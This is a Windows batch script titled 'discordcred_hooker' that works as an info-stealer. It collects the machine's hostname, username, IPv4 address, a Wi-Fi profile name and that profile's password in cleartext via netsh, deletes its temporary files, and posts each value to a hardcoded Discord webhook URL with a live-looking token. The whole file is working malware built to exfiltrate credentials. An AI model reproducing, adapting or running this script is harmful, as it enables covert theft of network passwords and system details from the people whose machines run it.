@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
title discordcred_hooker

echo ------------------------------------------- > line1.txt
hostname > host.txt
echo %username% > user.txt
ipconfig | find "IPv4" > ip.txt

echo ------------------------------------------- > line2.txt

for /f "tokens=2 delims=:" %%a in ( 'netsh wlan show profiles' ) do ( 
echo %%a > ssid.txt
) 

for /f "tokens=2 delims=:" %%a in ( 'netsh wlan show profiles' ) do ( 
set wifi=%%a 
) 
netsh wlan show profile %wifi% key=clear | find "Key Content" > wifipass.txt


set /p "ip=" < ip.txt
set /p "host=" < host.txt
set /p "user=" < user.txt
set /p "line1=" < line1.txt
set /p "line2=" < line2.txt
set /p "wifipass=" < wifipass.txt
set /p "ssid=" < ssid.txt

del ip.txt
del host.txt
del user.txt
del line1.txt
del line2.txt
del wifipass.txt
del ssid.txt

set webhook="https://discordapp.com/api/webhooks/1288994255355772948/_y-tOeyzn0escJxZNuathSLEGDuWjZlzo_Q2BNA3tyAhWF2QJ5yK4X9SnQxIhnYsgqwy"

curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line1%\"}" %webhook%
timeout /t 0 > nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ip%\"}" %webhook%
timeout /t 0 > nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%host%\"}" %webhook%
timeout /t 0 > nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%user%\"}" %webhook%
timeout /t 0 > nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%ssid%\"}" %webhook%
timeout /t 0 > nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%wifipass%\"}" %webhook%
timeout /t 0 > nul
curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%line2%\"}" %webhook%